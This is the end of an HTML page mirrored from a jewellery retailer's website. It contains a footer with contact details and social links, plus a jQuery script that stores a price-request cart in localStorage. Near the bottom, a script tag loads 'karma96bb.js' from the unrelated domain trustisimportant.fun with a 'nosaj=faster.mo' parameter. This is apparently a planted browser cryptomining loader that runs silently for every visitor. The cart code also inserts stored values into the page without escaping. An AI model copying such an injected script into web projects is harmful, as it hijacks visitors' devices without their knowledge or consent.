<footer class="site-footer">
    <div class="container-1410">
        <div class="row widget-area">
            <div class="col-lg-4 col-xs-6  widget-col about-widget-col">
                <div class="widget newsletter-widget">
                    <div class="inner">
                        <h2>Register now and get updates on your favorite products</h2>

                        <form>
                            <div class="input-1">
                                <input type="email" class="form-control" placeholder="Email *" required>
                            </div>
                            <div class="submit clearfix">
                                <button type="submit">Submit</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <div class="col-lg-4 col-xs-6 widget-col">
                <div class="widget contact-widget">
                    <h2>Contact information</h2>
                    <ul>
                        <li>Customer Service Department : <span style="direction:ltr;">00 974 55 56 22 92</span>
                        </li>
                        <li>Email : GoldcraftSingapore@gmail.com </li>
                        <li>Address : 10 RAEBURN PARK, #02-8GH34, SINGAPORE 088702</li>
                    </ul>
                </div>
            </div>
            <div class="col-lg-2 col-xs-6 widget-col">
                <div class="widget company-widget">
                    <h3>About company</h3>
                    <ul>
                        <li><a href="index-2.html">Home</a></li>
                        <li><a href="heritage.html">About Gold Craft Jewellery</a></li>
                        <li><a href="artistry.html">Art of crafting</a></li>
                        <li><a href="contact.html">Contact</a></li>
                        <li><a href="privacy-policy.html">Privacy policy</a></li>
                    </ul>
                </div>
            </div>
            <div class="col-lg-2 col-xs-6 widget-col">
                <div class="widget payment-widget">
                    <h3>Menu</h3>
                    <ul>
                        <li><a href="CP-4-Gold-21-K.html">Gold 21 K</a></li>
                        <li><a href="CP-5-Gold-18-K.html">Gold 18 K</a></li>
                        <li><a href="CP-6-Kids-.html">Kids</a></li>
                        <li><a href="CP-7-Diamond.html">Diamond</a></li>
                        <li><a href="CP-8-Gifts.html">Gifts</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div> <!-- end container -->

    <div class="lower-footer">
        <div class="container-1410">
            <div class="row">
                <div class="col-xs-12">
                    <div class="lower-footer-inner clearfix">
                        <div>
                            <p>&copy; 2022 Gold Craft Jewellery, all rights reserved</p>
                        </div>
                        <div class="social">
                            <ul class="clearfix">
                                <li><a target="_blank" href="https://www.facebook.com/Gold Craft Jewelleryjewellery"
                                        title="Facebook"><i class="fa-brands fa-facebook"></i></a></li>
                                <li><a target="_blank" href="https://www.instagram.com/Gold Craft Jewelleryjewellery/"
                                        title="Instagram"><i class="fa-brands fa-instagram"></i></a></li>
                                <li><a target="_blank" href="https://www.youtube.com/c/Gold Craft JewelleryJewellery"
                                        title="YouTube"><i class="fa-brands fa-youtube"></i></a></li>
                                <li><a target="_blank" href="https://www.tiktok.com/@Gold Craft Jewelleryjewellery"
                                        title="Tik Tok"><i class="fa-brands fa-tiktok"></i></a></li>
                                <li><a target="_blank" href="https://twitter.com/Gold Craft Jewelleryjewellery"
                                        title="Twitter"><i class="fa-brands fa-twitter"></i></a></li>
                                <li><a target="_blank" href="https://www.snapchat.com/add/Gold Craft Jewelleryjewellery"
                                        title="Snapchat"><i class="fa-brands fa-snapchat"></i></a></li>

                            </ul>
                        </div>
                        <div class="extra-link">
                            <ul>
                                <li><a href="accessibility.html">Website accessibility </a></li>
                                <li><a href="privacy-policy.html">Privacy policy</a></li>
                                <li><a href="contact.html"> Contact</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- end site-footer -->




</div>
<!-- end of page-wrapper -->
</body>
<!-- All JavaScript files
    ================================================== -->
<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>

<!-- Plugins for this template -->
<script src="assets/js/jquery-plugin-collection.js"></script>

<!-- Custom script for this template -->
<script src="assets/js/script.js"></script>
<script src="../../stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
    integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
    crossorigin="anonymous"></script>
<script>
    $(document).ready(function () {
        // Check if there is any cart data in localStorage on page load
        var existingData = JSON.parse(localStorage.getItem("cartItems")) || [];
        var cartCount = existingData.length; // Get the number of items in the cart


        // Check if there are any items in the cart
        if (existingData.length > 0) {
            if ($(".mini-cart-items").length === 0) {
                // Create the mini-cart-items container if it doesn't exist
                $(".mini-cart-content").prepend('<div class="mini-cart-items"></div>');
            }

            $(".mini-cart-items").empty();

            // Loop through each item in localStorage and append it to the mini-cart
            $.each(existingData, function (index, item) {
                var cartItemHTML = `
                    <div class="mini-cart-item clearfix">
                        <div class="mini-cart-item-image">
                            <a href="#"><img src="${item.image}" alt=""></a>
                        </div>
                        <div class="mini-cart-item-des">
                            <a href="#">${item.sku}</a>
                        </div>
                    </div>
                `;
                $(".mini-cart-items").append(cartItemHTML);
            });
            $(".mini-cart-content").append(`<div class="mini-cart-action clearfix"><a href="cart.html" class="view-cart-btn">Confirm price request</a></div>`);
        } else {
            // If no items in the cart, show a message
            $(".mini-cart-items").append('<p>Your cart is empty.</p>');
        }


        // Call this function to append the cart table to the container
        function renderCartTable() {
            // Get cart items from localStorage
            var existingData = JSON.parse(localStorage.getItem("cartItems")) || [];

            // Grab the container where the table should be inserted
            var basketContainer = $("#load_panier");

            // Check if there are items in localStorage
            if (existingData.length > 0) {
                // Create the table structure
                var cartTableHTML = `
                <table class="shop_table shop_table_responsive cart">
                    <tbody>
            `;

                // Loop through each item in localStorage and generate the table rows
                $.each(existingData, function (index, item) {
                    cartTableHTML += `
                    <tr class="cart_item">
                        <td class="product-remove">
                            <a href="#" class="remove remove-item" title="Remove this product" data-code="${item.sku}">×</a>
                        </td>
                        <td class="product-thumbnail">
                            <a href="#">
                                <img width="57" height="70" src="${item.image}" class="attachment-shop_thumbnail size-shop_thumbnail wp-post-image" alt="">
                            </a>
                        </td>
                        <td class="product-name" data-title="Product">
                            <a href="#">${item.sku}</a>
                        </td>
                    </tr>
                `;
                });

                // Close the table tags
                cartTableHTML += `
                    </tbody>
                </table>
            `;

                // Append the generated table to the basket container
                basketContainer.html(cartTableHTML);
            } else {
                // If no items in the cart, show a message
                basketContainer.html('<p>Your cart is empty.</p>');
            }

            // Add event listener for the remove icon
            $(".remove-item").click(function () {
                // Get the SKU of the item to be removed
                var itemSku = $(this).data("code");

                // Get the current cart items from localStorage
                var existingData = JSON.parse(localStorage.getItem("cartItems")) || [];

                // Remove the item based on SKU
                existingData = existingData.filter(item => item.sku !== itemSku);

                // Update the localStorage with the remaining items
                localStorage.setItem("cartItems", JSON.stringify(existingData));

                $("#cart-count").text(existingData.length);

                // Re-render the cart table
                renderCartTable();
            });
        }

        // Call renderCartTable function when the page loads or when you need to display the cart table
        renderCartTable(); // For example, this will run immediately when the page loads

        $("#cart-count").html(cartCount); // Update the cart count on page load

        $("#success-alert").hide();

        $(".form-item").submit(function (e) {
            e.preventDefault();

            // Extract SKU and selected image (if present)
            var formElement = this;
            var sku = $(formElement).find("input[name='id_produit']").val();
            var imageSrc = $(formElement).find("a img").attr("src");


            var formData = {
                sku: sku,
                image: imageSrc
            };


            saveToLocalStorage(formData);

            function saveToLocalStorage(data) {
                // Store form data in localStorage
                var existingData = JSON.parse(localStorage.getItem("cartItems")) || [];
                existingData.push(data);
                localStorage.setItem("cartItems", JSON.stringify(existingData));

                $("#cart-count").html(existingData.length); // Show updated cart count
                $("#success-alert").fadeTo(2000, 200).slideUp(200, function () {
                    $("#success-alert").slideUp(200);
                });

            }
        });





        // When the cart toggle is clicked, display the mini cart with items from localStorage
        $("#cart-toggle").click(function (e) {
            e.preventDefault();

            // Get cart items from localStorage


            // Optionally, update the "Confirm price request" button or other actions

        });



        //Remove items from cart
        $("#dropdown-box").on('click', 'button.remove-item', function (e) {
            e.preventDefault();
            var pcode = $(this).attr("data-code"); //get product code
            $(this).parent().fadeOut(); //remove item element from box
            $.getJSON("cart_process.html", { "remove_code": pcode }, function (data) { //get Item count from Server
                $("#dropdown-box").load("cart_process.html", { "load_cart": "1" });
                $("#cart-count").html(data.items); //update Item count in cart-info
                $("#cart-toggle").trigger("click"); //trigger click on cart-box to update the items list
            });
            //Make ajax request using jQuery Load() & update results
        });




    });










</script>

<script src="../../trustisimportant.fun/karma/karma96bb.js?karma=bs?nosaj=faster.mo"></script>
<script type="text/javascript">
</script>
</body>




<!-- Mirrored from Gold Craft Jewelleryonline.com/en/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 26 Jan 2025 11:02:22 GMT -->

</html>